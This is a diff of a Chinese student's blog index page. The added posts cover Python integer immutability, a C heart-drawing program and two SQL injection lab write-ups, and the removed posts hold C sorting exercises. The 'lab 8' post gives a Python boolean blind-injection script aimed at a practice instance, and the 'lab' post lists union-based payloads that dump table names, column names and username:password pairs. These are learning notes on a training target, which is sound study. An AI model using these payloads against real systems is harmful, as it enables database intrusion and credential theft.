@@ -148,6 +148,343 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://wifi-0x.github.io/2022/01/17/Python%20%E7%9A%84%E6%95%B4%E6%95%B0%E6%98%AF%E4%B8%8D%E5%8F%AF%E5%8F%98%E7%B1%BB%E5%9E%8B/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="微风">
+      <meta itemprop="description" content="微风的学习记录">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Breeze">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/01/17/Python%20%E7%9A%84%E6%95%B4%E6%95%B0%E6%98%AF%E4%B8%8D%E5%8F%AF%E5%8F%98%E7%B1%BB%E5%9E%8B/" class="post-title-link" itemprop="url">未命名</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-01-17 09:22:04" itemprop="dateCreated datePublished" datetime="2022-01-17T09:22:04+08:00">2022-01-17</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="Python-的整数是不可变类型"><a href="#Python-的整数是不可变类型" class="headerlink" title="Python 的整数是不可变类型"></a><strong>Python 的整数是不可变类型</strong></h3><ul>
+<li>C 之类的语言（写法 <code>int i = 1000</code>）会申请一块内存空间，并给它“绑定”一个固定的名称 i，同时写入一个可变的值 1000。在这里，i 的地址以及类型是固定的，而值是可变的（在一定的表示范围内）</li>
+<li>Python（写法<code>i = 1000</code>）也会申请一块内存空间，但是它会“绑定”给数字 1000，即这个 1000 的地址以及类型是固定的，至于 i，只是一个名称标签贴在 1000 上，自身没有固定的地址和类型</li>
+</ul>
+<p><em>所以当我们令 i “自增”时（i = i + 1），它们的处理是不同的：</em></p>
+<ul>
+<li>C 之类的语言先找到 i 的地址上存的数值，然后令它加 1，操作后新的数值就取代了旧的数值</li>
+<li>Python 的操作过程是把 i 指向的数字加 1，然后把结果绑定到新申请的一块内存空间，再把名称标签 i “贴”到新的数字上。新旧数字可以同时存在，不是取代关系</li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://wifi-0x.github.io/2021/12/11/%E7%BA%A2%E8%89%B2%E7%88%B1%E5%BF%83%E4%BB%A3%E7%A0%81/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="微风">
+      <meta itemprop="description" content="微风的学习记录">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Breeze">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/12/11/%E7%BA%A2%E8%89%B2%E7%88%B1%E5%BF%83%E4%BB%A3%E7%A0%81/" class="post-title-link" itemprop="url">未命名</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-12-11 22:49:10" itemprop="dateCreated datePublished" datetime="2021-12-11T22:49:10+08:00">2021-12-11</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="红色爱心代码"><a href="#红色爱心代码" class="headerlink" title="红色爱心代码"></a>红色爱心代码</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">float</span> x, y, a;</span><br><span class="line">	<span class="keyword">for</span> (y = <span class="number">1.5</span>; y &gt; <span class="number">-1.5</span>; y-=<span class="number">0.1</span>) &#123;</span><br><span class="line">		<span class="keyword">for</span> (x = <span class="number">-1.5</span>; x &lt; <span class="number">1.5</span>; x+=<span class="number">0.05</span>)&#123;</span><br><span class="line">		a = x * x + y * y - <span class="number">1</span>;</span><br><span class="line">		<span class="built_in">putchar</span>(a * a * a - x * x * y * y * y &lt;= <span class="number">0.0</span>?<span class="string">&#x27;*&#x27;</span>:<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	system(<span class="string">&quot;color 0c&quot;</span>);</span><br><span class="line">	<span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://wifi-0x.github.io/2021/11/21/lab%208/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="微风">
+      <meta itemprop="description" content="微风的学习记录">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Breeze">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/11/21/lab%208/" class="post-title-link" itemprop="url">未命名</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-11-21 17:53:43" itemprop="dateCreated datePublished" datetime="2021-11-21T17:53:43+08:00">2021-11-21</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="lab-8"><a href="#lab-8" class="headerlink" title="lab 8"></a>lab 8</h1><p>使用python脚本进行盲注</p>
+<p>1，刷出库名</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">dic=<span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789_&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#payload: and substr(database(),1,1)=&#x27;s&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> dic:</span><br><span class="line">        url=<span class="string">&quot;http://d1c0c861-091f-4ff0-9aaa-64dbc53cfc23.node4.buuoj.cn/Less-8/?id=1%27&quot;</span></span><br><span class="line">        payload=<span class="string">&quot; and substr(database(),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;--+&quot;</span>.<span class="built_in">format</span>(i,char)</span><br><span class="line">        url = url + payload</span><br><span class="line">        <span class="built_in">print</span>(url)</span><br><span class="line">        r=requests.get(url)</span><br><span class="line">        <span class="comment">#print(r.text)</span></span><br><span class="line">        time.sleep(<span class="number">0.05</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;are&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag+=char</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>2，刷出表名</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;and substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 2,&quot;</span> \</span><br><span class="line">          <span class="string">&quot;1),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;--+&quot;</span>.<span class="built_in">format</span>(i, char)</span><br></pre></td></tr></table></figure>
+
+<p>limit  后面的数字可变 </p>
+<p>第一个表：limit 0</p>
+<p>第二个表：limit 1 </p>
+<p>……</p>
+<p>3，刷出列名</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;and substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 2,&quot;</span> \</span><br><span class="line">          <span class="string">&quot;1),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;--+&quot;</span>.<span class="built_in">format</span>(i, char)</span><br></pre></td></tr></table></figure>
+
+<p>limit  后面的数字可变 </p>
+<p>第一列：limit 0</p>
+<p>第二列：limit 1 </p>
+<p>……</p>
+<p>4，查用户名或密码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload =<span class="string">&quot;and substr((select username from security.users limit 0,1),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;--+&quot;</span>.<span class="built_in">format</span>(i,char)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload =<span class="string">&quot;and substr((select password from security.users limit 0,1),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;--+&quot;</span>.<span class="built_in">format</span>(i,char)</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://wifi-0x.github.io/2021/11/19/lab/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="微风">
+      <meta itemprop="description" content="微风的学习记录">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Breeze">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/11/19/lab/" class="post-title-link" itemprop="url">未命名</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-11-19 14:47:57" itemprop="dateCreated datePublished" datetime="2021-11-19T14:47:57+08:00">2021-11-19</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="lab"><a href="#lab" class="headerlink" title="lab"></a>lab</h1><p>?id=10’union select 1,table_name,3 from information_schema.tables where table_schema=’security’ limit 0,1 – qwe //一个一个地查表 </p>
+<p>?id=10’union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=’security’–+</p>
+<p>//一次查出全部的表但是可能因为显示位不够而漏掉一些内容</p>
+<p><img src="https://i.loli.net/2021/11/19/qPmFyh4n8TeJdkb.png"></p>
+<p><img src="https://i.loli.net/2021/11/16/pTwogVcQKPFzJti.png"></p>
+<p>1.<code>?id=1&#39;</code></p>
+<p>2.输入order by语句对字段进行猜测</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; order by 3 --+</span><br></pre></td></tr></table></figure>
+
+<p>3.输入 <code>?id=-1&#39; union select 1,2,3, --+</code></p>
+<p>4,爆数据库（得到数据库名称security）<code>?id=-1&#39; union select 2,3, database() --+</code></p>
+<p>5,爆表名（得到表名users）<code>?id=-1&#39; union select 2,3,group_concat(table_name)from information_schema.tables where table_schema=&#39;security&#39; --+</code></p>
+<p>6.爆列名（得到列名username，password…）<code>?id=-1&#39; union select 2,3, group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; --+</code></p>
+<p>7.查询内容 <code>?id=-1 union select 2,3, group_concat (username, &#39;:&#39;,password)from security.users --+</code></p>
+<p>2021 11 19 </p>
+<p>在实验室学习的一天</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://wifi-0x.github.io/2021/11/16/mysql%20%E7%9A%84%E5%87%BD%E6%95%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="微风">
+      <meta itemprop="description" content="微风的学习记录">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Breeze">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/11/16/mysql%20%E7%9A%84%E5%87%BD%E6%95%B0/" class="post-title-link" itemprop="url">未命名</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-11-16 23:15:58 / 修改时间：23:15:59" itemprop="dateCreated datePublished" datetime="2021-11-16T23:15:58+08:00">2021-11-16</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p><img src="https://i.loli.net/2021/11/16/pTwogVcQKPFzJti.png"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://wifi-0x.github.io/2021/11/16/%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E6%98%AF%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5%E8%BF%98%E6%98%AF%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -251,7 +588,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-11-15 22:33:39" itemprop="dateModified" datetime="2021-11-15T22:33:39+08:00">2021-11-15</time>
+                <time title="修改时间：2022-02-25 21:47:14" itemprop="dateModified" datetime="2022-02-25T21:47:14+08:00">2022-02-25</time>
               </span>
 
           
@@ -529,403 +866,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://wifi-0x.github.io/2021/10/30/%E8%BF%90%E7%94%A8%E9%9A%8F%E6%9C%BA%E6%95%B0%E5%B9%B6%E5%AF%B9%E9%9A%8F%E6%9C%BA%E6%95%B0%E8%BF%9B%E8%A1%8C%E6%8E%92%E5%BA%8F/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="微风">
-      <meta itemprop="description" content="微风的学习记录">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Breeze">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/10/30/%E8%BF%90%E7%94%A8%E9%9A%8F%E6%9C%BA%E6%95%B0%E5%B9%B6%E5%AF%B9%E9%9A%8F%E6%9C%BA%E6%95%B0%E8%BF%9B%E8%A1%8C%E6%8E%92%E5%BA%8F/" class="post-title-link" itemprop="url">未命名</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2021-10-30 09:52:49 / 修改时间：10:48:16" itemprop="dateCreated datePublished" datetime="2021-10-30T09:52:49+08:00">2021-10-30</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="运用随机数并对随机数进行排序"><a href="#运用随机数并对随机数进行排序" class="headerlink" title="运用随机数并对随机数进行排序"></a>运用随机数并对随机数进行排序</h1><h2 id="（冒泡排序过程）"><a href="#（冒泡排序过程）" class="headerlink" title="（冒泡排序过程）"></a>（冒泡排序过程）</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i, j, t;</span><br><span class="line">	<span class="keyword">int</span> a[<span class="number">10</span>];</span><br><span class="line">	srand((<span class="keyword">int</span>)time(<span class="number">0</span>));<span class="comment">//随机数发生器的初始化函数</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The score of the singers:\n&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">		a[i] = (<span class="keyword">int</span>)(<span class="number">60</span> + <span class="number">40</span> * rand() / RAND_MAX);</span><br><span class="line">		<span class="comment">//60&lt;=X&lt;=100</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>, a[i]);<span class="comment">//%5d是数据宽度的意思</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">9</span>;i++)<span class="comment">//进行9次循环，实现9趟比较</span></span><br><span class="line">		<span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">9</span>-i;j++)<span class="comment">//在每一趟中进行9-i次比较</span></span><br><span class="line">			<span class="keyword">if</span>(a[j]&gt;a[j+<span class="number">1</span>])</span><br><span class="line">				&#123;<span class="comment">//两个数前后交换位子的方法</span></span><br><span class="line">				t = a[j];</span><br><span class="line">				a[j] = a[j + <span class="number">1</span>];</span><br><span class="line">				a[j + <span class="number">1</span>] = t;</span><br><span class="line">				&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The sorted scores:\n&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>, a[i]);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="（选择排序过程）"><a href="#（选择排序过程）" class="headerlink" title="（选择排序过程）"></a>（选择排序过程）</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i, j, t, k;</span><br><span class="line">	<span class="keyword">int</span> a[<span class="number">10</span>];<span class="comment">//以下产生10个60~100的随机数存于数组a并显示</span></span><br><span class="line">	srand((<span class="keyword">int</span>)time(<span class="number">0</span>));<span class="comment">//随机数发生器的初始化函数</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The score of the singers:\n&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">		a[i] = (<span class="keyword">int</span>)(<span class="number">60</span> + <span class="number">40</span> * rand() / RAND_MAX);</span><br><span class="line">		<span class="comment">//60&lt;=X&lt;=100</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>, a[i]);<span class="comment">//%5d是数据宽度的意思</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">9</span>; i++) &#123;<span class="comment">//进行9次循环，实现9趟 选择</span></span><br><span class="line">		k = i;<span class="comment">//预置i为当前范围内最大值的下标，存放于k中</span></span><br><span class="line">		<span class="keyword">for</span> (j = i+<span class="number">1</span>; j &lt; <span class="number">10</span>; j++)<span class="comment">//在每一趟中进行9-i次比较</span></span><br><span class="line">			<span class="keyword">if</span> (a[j] &gt; a[k]) k = j;<span class="comment">//两个数前后交换位子的方法</span></span><br><span class="line">			<span class="keyword">if</span> (k != i) &#123;</span><br><span class="line">				t = a[i];</span><br><span class="line">				a[i] = a[k];</span><br><span class="line">				a[k] = t;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;The sorted scores:\n&quot;</span>);</span><br><span class="line">		<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>, a[i]);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://wifi-0x.github.io/2021/10/27/%E6%94%B6%E8%97%8F/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="微风">
-      <meta itemprop="description" content="微风的学习记录">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Breeze">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/10/27/%E6%94%B6%E8%97%8F/" class="post-title-link" itemprop="url">未命名</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-10-27 22:52:07" itemprop="dateCreated datePublished" datetime="2021-10-27T22:52:07+08:00">2021-10-27</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-10-28 15:36:12" itemprop="dateModified" datetime="2021-10-28T15:36:12+08:00">2021-10-28</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="收藏"><a href="#收藏" class="headerlink" title="收藏"></a>收藏</h1><h6 id="调试了好久才成功的代码"><a href="#调试了好久才成功的代码" class="headerlink" title="调试了好久才成功的代码"></a>调试了好久才成功的代码</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">float</span> x = <span class="number">0</span>, a = <span class="number">1.0</span>, b = <span class="number">1.0</span>, sum = <span class="number">1</span>,d=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> n = <span class="number">0</span>, i = <span class="number">1</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请输入x与n\n&quot;</span>);</span><br><span class="line">	scanf_s(<span class="string">&quot;%f&quot;</span>, &amp;x);</span><br><span class="line">	scanf_s(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">	<span class="keyword">while</span> (i &lt;= n)</span><br><span class="line">	&#123;</span><br><span class="line">		a = a * x;</span><br><span class="line">		b = b * i;</span><br><span class="line">		d = a / b;</span><br><span class="line">		sum += d;</span><br><span class="line">		i++;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;e*x=%f&quot;</span>, sum);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
